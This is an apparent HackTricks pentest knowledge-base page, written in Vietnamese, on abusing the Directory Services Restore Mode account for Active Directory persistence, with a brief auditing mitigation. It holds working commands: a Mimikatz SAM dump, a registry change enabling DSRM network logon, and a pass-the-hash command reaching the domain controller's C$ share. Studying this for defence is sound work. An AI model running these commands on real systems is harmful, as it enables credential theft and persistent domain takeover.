# Thông tin xác thực DSRM

{{#include ../../banners/hacktricks-training.md}}

## Thông tin cơ bản

Mỗi domain controller đều có tài khoản quản trị viên Directory Services Restore Mode (DSRM). Mật khẩu của tài khoản này được đặt trong quá trình nâng cấp domain controller và tách biệt với các tài khoản domain Active Directory.<sup>[[1]](#references)</sup>

Kẻ tấn công có quyền kiểm soát quản trị trên domain controller có thể dump cơ sở dữ liệu SAM cục bộ và khôi phục NTLM hash của tài khoản quản trị viên DSRM. Lệnh Mimikatz sau đây thực hiện thao tác đó:<sup>[[2]](#references)</sup>

```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```

Theo mặc định, tài khoản DSRM chỉ dành cho chế độ khôi phục. Đặt `DsrmAdminLogonBehavior` thành `2` cho phép tài khoản cục bộ này xác thực khi domain controller đang hoạt động bình thường. Kiểm tra giá trị trước khi thay đổi:<sup>[[2]](#references)[[3]](#references)</sup>

```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue

if ($null -eq $current) {
    New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
} else {
    Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
}
```

Hash được khôi phục sau đó có thể được dùng trong phiên pass-the-hash để truy cập các tài nguyên như share quản trị `C$`. Với tài khoản cục bộ này, hãy dùng tên máy tính của domain controller làm giá trị `/domain`:<sup>[[3]](#references)</sup>

```powershell
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
# In the new PowerShell process, access C$ over NTLM.
ls \\dc-host-name\C$
```

## Biện pháp giảm thiểu

- Kiểm tra các thay đổi đối với `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`. Sự kiện bảo mật 4657 ghi lại việc sửa đổi giá trị registry khi SACL của khóa được cấu hình để kiểm tra các thao tác **Set Value**.<sup>[[4]](#references)</sup>

## References

- [1] [Microsoft: Đặt lại mật khẩu quản trị viên Directory Services Restore Mode](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
- [2] [ADSecurity: Duy trì quyền truy cập dai dẳng trong Active Directory một cách tinh vi #11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
- [3] [ADSecurity: Duy trì quyền truy cập dai dẳng trong Active Directory một cách tinh vi #13 — Duy trì quyền truy cập dai dẳng bằng DSRM v2](https://adsecurity.org/?p=1785)
- [4] [Microsoft: Sự kiện 4657 — Một giá trị registry đã được sửa đổi](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
{{#include ../../banners/hacktricks-training.md}}
